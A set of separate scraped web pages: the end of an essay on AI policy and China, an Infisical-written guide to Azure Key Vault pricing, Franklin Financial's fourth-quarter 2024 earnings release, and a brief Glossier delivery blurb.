advancements could drive global technology adoption away from traditional Western tech giants. The ethical and strategic dimensions of AI's expansion are critical points of discussion. Global leaders and tech gurus are now emphasizing the need for international cooperation to manage the rapid growth and risks associated with advanced AI systems. The balance between imposing restrictions and fostering collaborative innovation becomes crucial in shaping a responsible AI future. Strategically, while export controls aim to hinder China's technological rise , the emergence of effective Chinese AI models highlights a need to reconsider these approaches. Focusing on containing military applications of AI rather than general tech development might be a more sustainable strategy. This approach could encourage a nuanced conversation about AI governance and promote a more cooperative global framework. Ultimately, the shifting AI landscape underscores the importance of adaptations in policy and technological strategies concerning AI development . As China continues to expand its technological footprint, nations around the world need to balance the competitive and cooperative aspects of AI advancement. The future will likely demand more unified efforts in establishing comprehensive AI governance, pushing towards a balanced technological ecosystem where innovation thrives responsibly. title: Azure Key Vault Pricing | Complete Guide [2025 Edition]
summary: Explore Azure Key Vault pricing, including costs for secrets, keys, certificates, and transactions, and understand what impacts your total spend.
body_text: What is Azure Key Vault? Azure Key Vault is Microsoft's cloud-based service for securely storing and managing cryptographic keys, secrets, and certificates. It provides centralized storage and access control for sensitive information, helping organizations maintain robust security for their applications and services deployed on Azure or other platforms. The service is designed to safeguard cryptographic keys and other secrets using Hardware Security Modules (HSMs) and provides a comprehensive solution for secrets management that integrates seamlessly with other Azure services. Azure Key Vault Service Tiers Azure Key Vault offers two distinct service tiers: Standard Tier : Suitable for most general use cases with software-protected keys Premium Tier : Offers enhanced security with HSM-protected keys for critical applications "Software-protected keys" and "HSM-protected keys" are used to distinguish between keys that are protected by software-level encryption in Azure's cloud environment versus keys that are protected within FIPS 140-2 validated HSMs. This is similar to Infisical's two encryption strategies supported by Infisical KMS Let's examine the pricing and features of each tier in detail. Standard Tier Pricing The Standard tier provides software-protected keys and is the most commonly used option for general security needs. Operations Pricing Operation Type Price Price per secret operation $0.03 per 10,000 Price per certificate operation $0.03 per 10,000 Price per certificate renewal $3.00 per renewal request Each API call, such as create , get , list , update , delete , sign , verify , wrap , unwrap , encrypt , and decrypt , counts as one operation. Premium Tier Pricing The Premium tier supports both software-protected and HSM-protected keys, providing the highest level of security for critical applications. Software-Protected Keys Follows the same pricing structure as the Standard tier HSM-Protected Keys There is a separate pricing structure for storing keys in Hardware Security Modules (HSMs): Key Type Price RSA 2048-bit $1.00 per key per month + $0.03 per 10,000 transactions RSA 3072-bit $5.00 per key per month (first 250 keys) RSA 4096-bit $5.00 per key per month (first 250 keys) ECC keys $5.00 per key per month (first 250 keys) Additional Operations Operation Type Price Secrets Operations $0.03 per 10,000 transactions Certificate Operations $0.03 per 10,000 transactions Certificate Renewals $3.00 per renewal request Managed Azure Storage Account Key Rotation (Preview) $1.00 per renewal Important Pricing Considerations No setup fees are required to start using Azure Key Vault HSM key charges are not prorated and are billed based on usage within the previous 30 days Key Vault can be used with applications hosted anywhere, not just in Azure Only the key owner is billed for key usage Should You Use Azure Key Vault? Advantages Azure Integration : Azure Key Vault integrates natively with other Azure services, making it ideal for organizations running their infrastructure within the Azure ecosystem, in particular for those using Microsoft Entra ID for authentication Flexible Pricing Model : The tiered pricing structure allows organizations to scale their usage based on their specific needs while maintaining security. Comprehensive Security Features : Hardware Security Module (HSM) protection Access policies for fine-grained control Azure Private Link integration Robust auditing and logging capabilities Considerations Cost Management : While the pricing is flexible, costs can add up quickly with large numbers of keys or high transaction volumes. Azure Ecosystem : While the service can work with applications hosted on any platform, it is specifically designed for integration within the Azure ecosystem. Learning Curve : Organizations new to Azure may face a learning curve in implementing and managing Key Vault effectively. Azure Key Vault Alternatives Read about Azure Key Vault alternatives here . It's important to note that Azure Key Vault lacks certain functionalities that are commonly needed by developers and organizations, such as: Secret Versioning : While Azure Key Vault does support secret versioning, it is not very user-friendly . Approval Workflows : Azure Key Vault does not offer built-in approval workflows for secret access, which can be essential for maintaining security and compliance. Temporary Access Controls : Azure Key Vault does not provide temporary access controls for secrets, which can be useful for granting short-term access to specific resources. Automated Code Scanning : Azure Key Vault does not offer automated code scanning for secrets, which can help identify and prevent secrets from being exposed in code repositories. Comprehensive Integration Options : Azure Key Vault has limited integration options compared to other solutions, making it less flexible for organizations with diverse toolsets. Infisical provides an end-to-end suite of tools covering all these aspects of secrets management, and more. It boasts a more advanced feature set, at a cheaper price, and whithout vendor lock-in. In addition, Infisical is: Open source ( 16,000+ GitHub stars ) Self-hostable (on-premises or in the cloud) Platform-agnostic (works with any cloud provider or on-premises infrastructure) Focused on developer experience and ease of use More affordable, especially for smaller teams F.A.Q Is Azure Key Vault free to use? While Azure Key Vault doesn't offer a completely free tier, it follows a pay-as-you-go model with no upfront costs. You only pay for the keys, secrets, and operations you use. The service is also included in the Azure free tier, which provides limited usage for evaluation purposes. How does Azure Key Vault pricing compare to other solutions? Azure Key Vault's pricing is competitive within the cloud provider space, especially for organizations already using Azure services. However, for smaller teams or organizations not heavily invested in Azure, alternatives like Infisical may provide more cost-effective solutions with similar or additional functionality. Can I use Azure Key Vault with non-Azure applications? Yes, Azure Key Vault can be used with applications hosted anywhere, not just in Azure. However, the integration process might be more straightforward for Azure-hosted applications due to native service integration capabilities.

body_text: Investor Search Entire Investor Relations Site Press Releases Only Filings Only Press Release Franklin Financial Reports 2024 Q4 and Year-to-Date Results; Declares Dividend Company Release - 1/28/2025 Download the PDF version PDF Format (opens in new window) CHAMBERSBURG, Pa. , Jan. 28, 2025 /PRNewswire/ -- Franklin Financial Services Corporation (the Corporation) (NASDAQ: FRAF), the bank holding company of F&M Trust (the Bank) headquartered in Chambersburg, PA, reported its fourth quarter 2024 and year-to-date 2024 results. A summary of operating results follows: Net income for the fourth quarter of 2024 was $487 thousand ($0.11 per diluted share) compared to $4.2 million ($0.95 per diluted share) for the third quarter of 2024 (a decrease of 88.5%), and $3.5 million ($0.79 per diluted share) for the fourth quarter of 2023 (a decrease of 86.0%). The results for the fourth quarter of 2024 were affected by a $3.4 million after tax loss on the sale of investment securities sold as part of a portfolio restructuring that occurred during the fourth quarter. This event is more thoroughly described on a Form 8-K previously filed by the Corporation on October 18, 2024. See the GAAP versus Non-GAAP disclosure that presents summary results which exclude the effect of the securities loss. Net income year-to-date for 2024 was $11.1 million ($2.51 per diluted share) compared to $13.6 million ($3.10 per diluted share) for the same period in 2023, a decrease of 18.4%. Year-to-date income was also affected by the loss on securities that was part of the portfolio restructuring previously mentioned. The provision for credit losses was $500 thousand for the fourth quarter of 2024 compared to $485 thousand for the third quarter of 2024 and $788 thousand for the fourth quarter of 2023. Year-to-date, the provision expense was $2.0 million compared to $2.7 million for the same period in 2023. Total assets were $2.198 billion as of December 31, 2024, up 19.7% from December 31, 2023. Total net loans increased $139.5 million (11.2%) to $1.380 billion at December 31, 2024 from $1.241 billion at December 31, 2023. Total deposits increased $277.7 million (18.1%) to $1.816 billion at December 31, 2024 from $1.538 billion at December 31, 2023. At December 31, 2024, borrowings from the Federal Home Loan Bank of Pittsburgh were $200.0 million. Shareholders' equity increased by $12.6 million, year-to-date, to $144.7 million, and the book value of the Corporation's common stock increased to $32.69 per share. For the year-to-date period, Return on Assets (ROA) was 0.54%, Return on Equity (ROE) was 8.05% and the Net Interest Margin (NIM) was 2.95%, compared to an ROA of 0.78%, ROE of 11.39% and NIM of 3.31% for the same period in 2023. On January 16, 2025, the Board of Directors declared a $0.32 per share regular quarterly cash dividend for the first quarter of 2025 to be paid on February 26, 2025, to shareholders of record at the close of business on February 7, 2025. Balance Sheet Highlights Total assets at December 31, 2024 were $2.198 billion up 19.7% from $1.836 billion at December 31, 2023. Changes in the balance sheet from December 31, 2023, to December 31, 2024, include: Debt securities available for sale increased $36.1 million (7.6%) due to purchases made during the fourth quarter. At December 31, 2024, the net unrealized loss in the portfolio was $45.5 million compared to a net unrealized loss of $49.4 million at year-end 2023. Net loans increased $139.5 million (11.2%) over the year-end 2023 balance, primarily from increases in commercial real estate loans of $99.6 million, and first lien 1-4 family real residential real estate of $35.3 million. At December 31, 2024, commercial real estate loans totaled $803.4 million, with the largest collateral segments being: apartment buildings ($146.7 million), hotels and motels ($97.5 million), and office buildings ($92.9 million) which are located primarily in south-central Pennsylvania. Total deposits increased $277.7 million (18.1%) from year-end 2023, due to an increase in noninterest-bearing deposits ($17.3 million), money management deposits ($122.8 million), and time deposits ($183.5 million), which were partially offset by a $36.6 million decrease in interest-bearing checking deposits. The majority of the increase in time deposits was from retail customers. Excluding the increase in brokered time deposits, deposits increased $212.7 million (13.8%) from year-end 2023. The Bank's cost of deposits for 2024 averaged 1.89% compared to 1.23% for the same period in 2023. At December 31, 2024, the Bank estimated that approximately 85% of its deposits were FDIC insured or collateralized. At December 31, 2024 the Bank had borrowings of $200.0 million from the Federal Home Loan Bank of Pittsburgh (FHLB). The Bank has additional funding capacity with the Federal Reserve, FHLB and correspondent banks. Shareholders' equity increased $12.6 million from December 31, 2023. Retained earnings increased $5.5 million, net of dividends of $5.6 million paid to shareholders during 2024. The accumulated other comprehensive loss (AOCI) decreased from $40.9 million at year-end 2023 to $35.5 million from a decrease in the unrealized loss in the investment portfolio due in part to the realization of losses on the previously mentioned security sales. At December 31, 2024, the book value of the Corporation's common stock was $32.69 per share and tangible book value(1) was $30.65 per share. In January 2025, the Board of Directors approved an open market repurchase plan to repurchase 150,000 shares through December 31, 2025. The Bank is considered to be "well-capitalized" under regulatory guidelines as of December 31, 2024. Average 2024 year-to-date earning assets were $1.983 billion compared to $1.656 billion in 2023, an increase of 19.8%. The average balance of interest-earning cash increased $125.6 million (248.9%) due to an increase in borrowings during the first quarter of 2024 that have not been fully invested into higher yielding assets. The average balance of the investment portfolio increased $22.2 million (4.8%), while the average balance of the loan portfolio increased $179.2 million (15.7%), over the prior year averages. Within the loan portfolio, the average balance of commercial real estate loans increased $120.2 million over the 2023 average, and 1-4 family residential real estate loans increased $52.5 million on average, year-over-year. Total deposits averaged $1.638 billion for 2024, an increase of $108.7 million (7.1%) over the average balance for 2023. On a year-to-date comparison, the yield on earning assets increased from 4.70% in 2023 to 5.16% in 2024, while the cost of interest-bearing liabilities increased from 1.75% to 2.68%. Income Statement Highlights Net interest income was $15.1 million for the fourth quarter of 2024 compared to $14.7 million for the third quarter of 2024 and $13.9 million for the fourth quarter of 2023. Year-to-date, net interest income for 2024 increased 7.2% from 2023 to $57.5 million. The net interest margin (NIM) was 2.92% for the fourth quarter of 2024 down from 2.97% in the prior quarter and 3.24% for the fourth quarter of 2023. On a year-to-date basis, the NIM was 2.95% compared to 3.31% for the same period of 2023. The provision for credit losses on loans was $451 thousand for the fourth quarter of 2024 compared to $474 thousand and $732 thousand for the third quarter of 2024 and the fourth quarter of 2023, respectively. The provision for credit losses on loans was $2.0 million for 2024, down from $2.6 million in 2023. The provision expense for loans was necessary due to growth in the loan portfolio as credit quality measures are good and there were no material changes to the qualitative loss factors. The Allowance for Credit Losses (ACL) for loans was 1.26% at December 31, 2024 down slightly from 1.28% on December 31, 2023. The provision for credit losses on unfunded commitments was $49 thousand for the fourth quarter of 2024 and $8 thousand on a year-to-date basis. The ACL for unfunded commitments was $2.0 million at December 31, 2024. Noninterest income totaled $288 thousand for the fourth quarter of 2024 compared to $4.9 million in the third quarter of 2024 (a decrease of 94.1%), and $4.1 million for the fourth quarter of 2023 (a decrease of 92.9%). The decrease in noninterest income during the fourth quarter of 2024 was due to a $4.3 million (pre-tax) loss on the sale of securities previously discussed. Excluding this loss(1), noninterest income would have decreased 6.1% when compared to the third quarter of 2024 and increased 11.5% over the fourth quarter of 2023. From the third quarter to the fourth quarter of 2024, wealth management fees increased $74 thousand and the gain on sale of mortgages increased $5 thousand, however, these increases were more than offset by a decrease of $321 thousand in the fair value of equity securities. Noninterest income year-to-date was $13.7 million, a decrease of 7.9% from $14.9 million in 2023. Noninterest income for 2024 includes the $4.3 million pre-tax securities loss, while the 2023 results include pre-tax security losses of $1.1 million. Excluding the losses in both periods(1), noninterest income would have increased $2.0 million (12.5%) from 2023. Year-over-year, wealth management fees increased $1.0 million (13.7%), gains on the sale of mortgages increased $366 thousand (184.0%), and debit card fee income increased $122 thousand (5.7%). Noninterest expense for the fourth quarter of 2024 was $14.3 million compared to $13.9 million for the third quarter of 2024 (an increase of 3.0%), and $13.1 million in the fourth quarter of 2024 (an increase of 9.0%). The increase over the third quarter of 2024 occurred primarily in salaries and benefits, reflecting additional expense for incentive compensation plans. Noninterest expense was $55.9 million for 2024 compared to $50.0 million in 2023, an increase of $5.9 million (11.8%). Contributing to the year-over-year increase were increases of $3.9 million in salaries and benefits (primarily salaries due to a highly competitive labor market and health insurance), $1.0 million in data processing expenses, and $859 thousand in FDIC premiums. The effective federal income tax rate was 16.6% for 2024 and 13.7% in 2023 which included certain tax credits not recognized in 2024. "I am excited for our future," said Tim Henry, CEO. "We have just finished our second straight year of outstanding loan and deposit growth while at the same time maintaining a strong balance sheet. Coupled with strong non-interest income, led by our wealth management division, we have been able to continue to invest in ourselves by putting in new systems and infrastructure that support good decision making and future growth, and restructuring the balance sheet, through the sale and reinvestment of low earning assets, that will support improved profitability. The team at Franklin Financial and F&M Trust have done a great job of adapting to extreme situations and working through them with an eye to our future and how we can bring value to our shareholders, customers and communities." Franklin Financial is the largest independent, locally owned and operated bank holding company headquartered in Franklin County with assets of more than $2.1 billion. Its wholly-owned subsidiary, F&M Trust, has twenty-three community banking locations in Franklin, Cumberland, Dauphin, Fulton and Huntingdon Counties PA, and Washington County MD. title: Glossier Same-Day Delivery
summary: Need your Glossier beauty essentials delivered to your home? Glossier offers in-store pickup options, and Getcho can deliver your order same-day.
body_text: Get Your Glossier Order with Same-Day Delivery from Getcho Need your beauty essentials from Glossier delivered to your home? Use Getcho for same day delivery of your Glossier orders.
